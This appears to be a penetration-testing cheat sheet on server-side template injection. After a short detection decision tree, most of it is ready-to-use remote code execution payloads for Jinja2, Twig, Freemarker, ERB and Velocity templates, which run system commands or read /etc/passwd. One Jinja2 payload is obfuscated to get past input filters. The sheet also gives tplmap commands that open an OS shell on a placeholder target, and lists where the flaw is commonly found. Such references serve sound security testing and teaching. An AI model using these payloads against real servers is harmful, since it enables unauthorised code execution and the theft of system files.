# SSTI — Server-Side Template Injection

**CWE:** CWE-94 | **OWASP:** A03:2021

---

## Detection Decision Tree

```
Inject: ${{<%[%'"}}%\.

If error → template engine detected
If output modified → template evaluated input

Then test:
  {{7*7}} → 49?         YES → Jinja2 / Twig
  ${7*7}  → 49?         YES → Freemarker / Velocity
  #{7*7}  → 49?         YES → Ruby (Slim/HAML)
  <%= 7*7 %> → 49?      YES → ERB / ASP.NET Razor
```

---

## Engine-Specific RCE

### Jinja2 (Python/Flask/Django)
```python
# Basic RCE
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}

# Class traversal method
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}

# cycler RCE (Jinja2)
{{ cycler.__init__.__globals__.os.popen('id').read() }}

# joiner RCE
{{ joiner.__init__.__globals__.os.popen('id').read() }}

# namespace RCE
{{ namespace.__init__.__globals__.os.popen('id').read() }}

# With filter bypass (no dots)
{{ request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr("popen")("id")|attr("read")() }}
```

### Twig (PHP)
```php
{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self.env.getFilter("id")}}

# Alternative
{{ ['id']|map('system') }}
```

### Freemarker (Java)
```java
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("id")}

${"freemarker.template.utility.Execute"?new()("id")}
```

### ERB (Ruby)
```ruby
<%= `id` %>
<%= system("id") %>
<%= IO.popen("id").read %>
```

### Velocity (Java)
```java
#set($x = "")
#set($rt = $x.class.forName("java.lang.Runtime"))
#set($chr = $x.class.forName("java.lang.Character"))
#set($str = $x.class.forName("java.lang.String"))
#set($ex = $rt.getRuntime().exec("id"))
$ex.waitFor()
#set($out = $ex.getInputStream())
```

---

## Automated Detection

```bash
# tplmap — automated SSTI detection and exploitation
python3 tplmap.py -u "https://target.com/render?name=test"
python3 tplmap.py -u "https://target.com/render" -d "name=test"

# OS shell via tplmap
python3 tplmap.py -u "https://target.com/render?name=test" --os-shell
```

---

## Where to Find SSTI

```
- Template name fields (email templates, report names)
- User display names rendered in system-generated emails
- PDF generation endpoints
- Report/notification subject lines
- Invoice/document title fields
- Error pages that reflect user input
- Personalization features ("Hello {{name}}")
```
